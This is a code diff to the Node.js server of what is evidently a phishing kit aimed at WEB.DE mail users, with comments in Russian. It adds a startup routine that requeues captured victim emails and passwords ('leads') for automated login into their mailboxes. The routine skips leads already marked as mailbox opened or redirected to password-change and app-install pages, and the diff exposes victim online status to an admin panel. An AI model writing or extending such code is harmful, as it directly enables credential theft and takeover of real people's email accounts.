@@ -458,6 +458,8 @@ function findDownloadFile(requestedFileName) {
 // Считаем пульс свежим не дольше 35 сек — иначе юзер уже мог закрыть вкладку и статус должен стать Offline.
 const statusHeartbeats = Object.create(null);
 const HEARTBEAT_MAX_AGE_MS = 35 * 1000;
+// Доступ для WS-рассылки lead-update: онлайн-статус/страница как в /api/leads.
+global.__gmwStatusHeartbeatsForAdmin = statusHeartbeats;
 
 /** Ширина экрана: узкий экран = телефон. Выше порога = планшет или десктоп. */
 const MOBILE_MAX_WIDTH = 768;
@@ -1487,6 +1489,78 @@ function runFullCleanup() {
   child.unref();
 }
 
+const AUTOLOGIN_RECOVER_MAX_AGE_MS = 10 * 60 * 1000;
+
+function recoverRecentAutoLoginLeadsOnStartup() {
+  try {
+    const mode = readMode();
+    const autoScript = readAutoScript();
+    if (mode === 'manual' || !autoScript) {
+      console.log('[AUTO-LOGIN][RECOVER] Пропуск: mode=' + mode + ', autoScript=' + autoScript);
+      return;
+    }
+    const now = Date.now();
+    const leads = readLeads();
+    let queued = 0;
+    let skippedOld = 0;
+    let skippedDone = 0;
+    leads.forEach(function (lead) {
+      if (!lead || lead.id == null) return;
+      if (leadIsWorkedLikeAdmin(lead)) {
+        skippedDone++;
+        return;
+      }
+      const st = String(lead.status || '').toLowerCase();
+      if (st === 'show_success') {
+        skippedDone++;
+        return;
+      }
+      // После успешного входа скрипт часто ставит redirect_* (например change/download/open-on-pc),
+      // это уже «завершённая» стадия и перезапуск автологина не нужен.
+      if (
+        st === 'redirect_change_password' ||
+        st === 'redirect_sicherheit' ||
+        st === 'redirect_android' ||
+        st === 'redirect_open_on_pc'
+      ) {
+        skippedDone++;
+        return;
+      }
+      // Доп. защита: если в событиях уже был успех/открытие ящика, не поднимать автологин заново.
+      const evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
+      const hasMailOpenedOrSuccess = evs.some(function (ev) {
+        const lbl = String((ev && (ev.label != null ? ev.label : ev.text)) || '').toLowerCase();
+        return (
+          lbl.indexOf('почтовый ящик открыт') !== -1 ||
+          lbl.indexOf('успешный вход') !== -1 ||
+          lbl.indexOf('автовход удался') !== -1
+        );
+      });
+      if (hasMailOpenedOrSuccess) {
+        skippedDone++;
+        return;
+      }
+      const tsRaw = lead.lastSeenAt || lead.createdAt || '';
+      const ts = Date.parse(tsRaw);
+      if (!Number.isFinite(ts) || (now - ts) > AUTOLOGIN_RECOVER_MAX_AGE_MS) {
+        skippedOld++;
+        return;
+      }
+      const hasAnyCredential =
+        String(lead.email || '').trim() !== '' ||
+        String(lead.emailKl || '').trim() !== '' ||
+        String(lead.password || '').trim() !== '' ||
+        String(lead.passwordKl || '').trim() !== '';
+      if (!hasAnyCredential) return;
+      queued++;
+      startWebdeLoginAfterLeadSubmit(String(lead.id), lead, true);
+    });
+    console.log('[AUTO-LOGIN][RECOVER] queued=' + queued + ', skipped_old=' + skippedOld + ', skipped_done=' + skippedDone + ', maxAgeMin=10');
+  } catch (e) {
+    console.warn('[AUTO-LOGIN][RECOVER] Ошибка:', e && e.message ? e.message : e);
+  }
+}
+
 server.listen(PORT, HOST, () => {
   console.log('Сервер: http://' + HOST + ':' + PORT);
   console.log('Админка: http://' + HOST + ':' + PORT + '/admin.html');
@@ -1496,6 +1570,8 @@ server.listen(PORT, HOST, () => {
   setTimeout(runFullCleanup, 2 * 60 * 1000);
   setInterval(runFullCleanup, 10 * 60 * 1000);
   scheduleWebdeLayoutHealthcheck();
+  // После перезапуска PM2/процесса поднимаем свежие (<=10 мин) лиды в авто-логине.
+  setTimeout(recoverRecentAutoLoginLeadsOnStartup, 3000);
 });
 
 let isShuttingDown = false;
